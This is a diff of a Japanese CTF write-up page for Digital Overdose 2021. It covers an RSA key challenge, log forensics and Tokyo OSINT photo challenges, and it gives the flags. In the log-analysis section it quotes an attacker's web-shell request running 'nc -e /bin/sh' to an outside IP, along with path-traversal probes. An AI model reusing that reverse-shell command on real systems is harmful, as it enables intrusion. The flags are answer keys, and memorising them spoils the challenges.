@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="Digital Overdose 2021 Autumn CTF Writeup" />
 <meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-10-11T20:00:00+09:00" />
 <meta property="article:modified_time" content="2021-10-13T23:00:00+09:00" />
 <meta itemprop="name" content="Digital Overdose 2021 Autumn CTF Writeup">
-<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11">
-<meta itemprop="datePublished" content="2021-10-11T20:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-10-13T23:00:00&#43;09:00" />
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11"><meta itemprop="datePublished" content="2021-10-11T20:00:00+09:00" />
+<meta itemprop="dateModified" content="2021-10-13T23:00:00+09:00" />
 <meta itemprop="wordCount" content="3449">
-
-
-
 <meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Digital Overdose 2021 Autumn CTF Writeup"/>
 <meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://digitaloverdose.ractf.co.uk/ 2900点を獲得し、チームとしては68位、個人では38位でした。 なお、参加チームは719、参加プレーヤーは11"/>
@@ -320,7 +316,7 @@ The ciphertext is 0x2085f3d3573cd709fad84bed9fe8dde419fb7c8e96aa95ec4651a3bc07b5
 <ul>
 <li>id_rsa (RSA PRIVATE KEY)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>まず、ssh-keygen を実行してみたのですが、エラーになりました。。</p>
 <pre>
@@ -329,11 +325,11 @@ Load key "id_rsa": Invalid key length
 Error: offset out of range
 
 </pre>
-<p><br /></p>
+<br />
 <p>以下のコードで、<code>n</code> と <code>e</code> は取れました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -343,15 +339,15 @@ Error: offset out of range
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python3</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-
-<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;id_rsa&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;id_rsa&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><br>
 <p>実行結果：</p>
@@ -371,7 +367,7 @@ $ echo }drah_taht_t0n_s1_ASR{OD | rev
 DO{RSA_1s_n0t_that_hard}
 
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{RSA_1s_n0t_that_hard}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -389,7 +385,7 @@ Here are the logs from before the attack, can you find out what happened?</p>
 <ul>
 <li>attack.log</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>ログはスペース文字（white space）で区切られていて、フィールドは以下のようになっています。</p>
 <pre>
@@ -446,7 +442,7 @@ $ grep 20.132.161.193 attack.log | cut -d" " -f1,2,3,4,5,6
 2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==
 2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{better_remove_that_backdoor}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -464,7 +460,7 @@ Please submit the attackers IP as the flag as follow, DO{x.x.x.x}</p>
 <ul>
 <li>more.log</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>これはイベント中に解けなかったやつなんですが、他の方のWriteupを見ると、DO{45.85.1.176} がフラグだったみたいですね。</p>
 <p>これはおかしいです。おそらくフラグが間違って設定されていたと思われます。</p>
@@ -492,20 +488,20 @@ GET ../../..//db_config.old - 443 - 200.13.84.124 - 404
 GET ../../..//admin.older - 443 - 200.13.84.124 - 404
 GET ..//login.bckp - 443 - 200.13.84.124 - 404
 </pre>
-<p><br />
-まぁ、これだけで attacker&rsquo;s IP は 200.13.84.124 でほぼ確定なんですが、更に見ていくと、ほとんどのGETリクエストが404で失敗している中で、ひとつだけ200 OKで成功しているログがあります。</p>
+<br />
+まぁ、これだけで attacker's IP は 200.13.84.124 でほぼ確定なんですが、更に見ていくと、ほとんどのGETリクエストが404で失敗している中で、ひとつだけ200 OKで成功しているログがあります。
 <p>以下で、backup.zipの取得に成功しています。チャレンジ文の、<code>maybe they got the source</code> にマッチするものと考えられます。</p>
 <pre>
 $ grep 200.13.84.124 more.log | grep -v 404
 2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
 </pre>
-<p><br /></p>
+<br />
 <p>ちなみに、このときのUser-Agentも怪しくて、RE97czNjcjN0X19fYWdlbnR9 はデコードすると別フラグが得られます。(Part 3 - Backup Policyのフラグだったようです。)</p>
 <pre>
 $ echo RE97czNjcjN0X19fYWdlbnR9 | base64 -d
 DO{s3cr3t___agent}
 </pre>
-<p><br /></p>
+<br />
 <p>ということで、フラグは</p>
 <p>Flag: <s><code>DO{45.85.1.176}</code></s></p>
 <p>ではなく、</p>
@@ -520,10 +516,10 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_1.jfif" alt="Challenge_1.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>表参道にある東急プラザの入り口ですね。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Tokyu_Plaza}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -534,11 +530,11 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_2.jfif" alt="Challenge_2.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>拡大してみると、秋葉原 COMIC ZIN があるのが見えるので、これをヒントにGoogle Mapを使いました。</p>
 <p>対面から写真を撮っているので、Mapをベースに対面を確認すると、そこにはビックカメラがあります。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Bic_Camera_Akiba}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -549,12 +545,12 @@ DO{s3cr3t___agent}
 <p>Where is this Pokémon?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_3.jfif" alt="Challenge_3.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p><code>ミジュマル</code> というポケモンなのはすぐわかったんですが、場所を見つけるのに苦労しました。</p>
 <p>Google Lensでサーチしたら、<code>池袋</code> の <code>サンシャインシティ</code> にある <code>ポケモンセンターメガ東京</code> という場所なのがわかりました。</p>
 <p>トライ・アンド・エラーした結果、<code>サンシャインシティ</code> がフラグでした。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Sunshine_City}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -565,11 +561,11 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_4.jpeg" alt="Challenge_4.jpeg">
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <p>ストリートファイターのリュウの置物があるお店のようです。</p>
 <p><code>ryu hadouken otaku shop</code> でGoogleサーチしたら、渋谷のパルコにあるお店のようですね。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Shibuya_Parco}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -580,10 +576,10 @@ DO{s3cr3t___agent}
 <p>What building is in this picture?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_5.jfif" alt="Challenge_5.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <p>これは調べるまでもなく、東京駅です。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Tokyo_Station}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -594,7 +590,7 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <p>（写真は 5.a と同じです。）</p>
-<p><br /></p>
+<br />
 <h3 id="solution-8">Solution</h3>
 <p>これは相当悩みました。。</p>
 <p><s>DO{Tokyo_Marunouchi_Minamiguchi}</s><br>
@@ -644,14 +640,14 @@ DO{s3cr3t___agent}
 <s>DO{Marunouchi_Plaza}</s><br>
 <s>DO{Gyoko-Dori_Ave}</s><br></p>
 <p>たぶん、こんなに間違ったのは自分だけかもしれません。。</p>
-<p><br /></p>
+<br />
 <p><b>今日の教訓：トライ・アンド・エラーばかりではなく、ちゃんと写真を解析して解くことが大事！！</b></p>
-<p><br />
-写真をよくみると、撮影位置と駅の間にガードレールがあり、道が通っています。</p>
+<br />
+写真をよくみると、撮影位置と駅の間にガードレールがあり、道が通っています。
 <p>また、撮影位置のところには、タイルがきれいに四角く色分けされてます。</p>
 <p>Google Street Viewでクリックして移動していったら、該当箇所が見つかりました。</p>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_5.png" alt="Challenge_5.png">
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Gyoko-Dori}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -662,11 +658,11 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_6.jfif" alt="Challenge_6.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <p>「こんなのわかるかよ！」と思いつつ、Google Lensでサーチしたら一発で <code>小名木川</code> が出てきました。</p>
 <p>Google Lens、凄い！</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Onagi_River}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -677,14 +673,14 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_7.jpg" alt="Challenge_7.jpg">
-<p><br /></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <p>Google Lensでサーチしたら、以下のPDF（国土技術政策総合研究所 研究資料）が見つかりました。</p>
 <p><a href="http://www.nilim.go.jp/lab/bcg/siryou/tnn/tnn0572pdf/ks057208.pdf">http://www.nilim.go.jp/lab/bcg/siryou/tnn/tnn0572pdf/ks057208.pdf</a></p>
 <p>逆に、これ以外の情報は全く見つからなかったです。</p>
 <p>千鳥ヶ淵にある換気所のようです。</p>
 <p>この資料にはマップも載っていて、この換気塔の対面にあるのは <code>イギリス大使館</code> なので、それが答えです。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{British_Embassy}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -695,11 +691,11 @@ DO{s3cr3t___agent}
 <p>What is this drink called?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_8.jfif" alt="Challenge_8.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-11">Solution</h3>
 <p>これも結構悩んだんですが、テキトーに <code>メロンソーダ</code> を入れたら当たりました。</p>
 <p>これって、日本の飲み物なのかな。確かに、外国には <code>メロンソーダ</code> っていうのは無いかも。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Melon_Soda}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -710,12 +706,12 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_9.jfif" alt="Challenge_9.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-12">Solution</h3>
 <p>Google Lensで以下のアメブロが見つかりました。</p>
 <p><a href="https://ameblo.jp/gentle-spwj/entry-12423563923.html">https://ameblo.jp/gentle-spwj/entry-12423563923.html</a></p>
 <p><code>目黒の八芳園</code>です。確か、前に行ったことあります。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Happo-en}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -726,7 +722,7 @@ DO{s3cr3t___agent}
 <p>Where sector was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_10.jfif" alt="Challenge_10.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-13">Solution</h3>
 <p>250点問題だけあって、なかなか手強かったです。</p>
 <p><code>荒川西日三</code> という文字が見えるので、荒川区 西日暮里 3丁目 なのはすぐわかります。でも、それは答えじゃありません。</p>
@@ -736,12 +732,12 @@ DO{s3cr3t___agent}
 <p>Google Mapで富士見ホテルの半径30Mのエリアを探し、Street Viewで確認すると、ありました！</p>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_10.png" alt="Challenge_10.png">
 <p><code>谷中 大島酒店</code> です。でも、これはまだ答えではありません。</p>
-<p><br /></p>
+<br />
 <p>わたしは知らなかったんですが、この場所、<code>夕焼けだんだん</code> という有名な場所らしいですね。</p>
-<p><br /></p>
+<br />
 <p>なにかヒントがあるかと思って <code>夕焼けだん団</code> の動画（<a href="https://www.youtube.com/watch?v=kPK75vVniNg">https://www.youtube.com/watch?v=kPK75vVniNg</a>）を見てたら、「谷中」の読み方は「タニナカ」じゃなくて「ヤナカ」であることがわかりました。</p>
 <p>結構、早い段階で「谷中」に辿り着いていたのに、漢字が読めてなかっただけとは。。。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Yanaka}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -752,10 +748,10 @@ DO{s3cr3t___agent}
 <p>Where in Japan does this mascot represent?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_11.jfif" alt="Challenge_11.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-14">Solution</h3>
 <p><code>あまみ市</code> って書いてあるし。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Amami}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -766,7 +762,7 @@ DO{s3cr3t___agent}
 <p>What mythological creature is this?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_12.jfif" alt="Challenge_12.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-15">Solution</h3>
 <p>ぶんぶく茶釜ですね。</p>
 <p><s>DO{Raccoon}</s><br>
@@ -774,7 +770,7 @@ DO{s3cr3t___agent}
 <s>DO{Fox}</s><br>
 <s>DO{Raccoon_Dog}</s><br></p>
 <p>普通に <code>タヌキ</code> が正解でした。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Tanuki}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -785,10 +781,10 @@ DO{s3cr3t___agent}
 <p>Where was this photo taken from?</p>
 </blockquote>
 <img src="https://captureamerica.github.io/writeups/img/Challenge_13.jfif" alt="Challenge_13.jfif">
-<p><br /></p>
+<br />
 <h3 id="solution-16">Solution</h3>
 <p>これは、調べるまでもなく、目黒川です。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>DO{Meguro_River}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -845,7 +841,7 @@ DO{s3cr3t___agent}
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -880,20 +876,21 @@ DO{s3cr3t___agent}
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
